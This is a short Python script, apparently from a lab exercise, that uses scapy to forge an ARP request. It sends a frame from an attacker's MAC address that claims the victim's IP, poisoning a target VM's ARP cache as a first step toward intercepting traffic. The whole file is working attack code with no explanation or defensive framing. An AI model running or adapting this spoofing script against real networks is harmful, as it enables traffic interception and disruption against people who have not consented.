from scapy.all import *

VM_IP = "192.168.147.147"
VM_MAC = "00:0c:29:58:c3:1c"
VICTIM_IP = "192.168.147.150"
ATTACKER_MAC = "00:0c:29:91:6f:ba"

ether = Ether()
ether.dst = VM_MAC
ether.src = ATTACKER_MAC

arp = ARP()
arp.psrc = VICTIM_IP
arp.hwsrc = ATTACKER_MAC
arp.pdst = VM_IP
arp.op = 1

frame = ether/arp
sendp(frame)

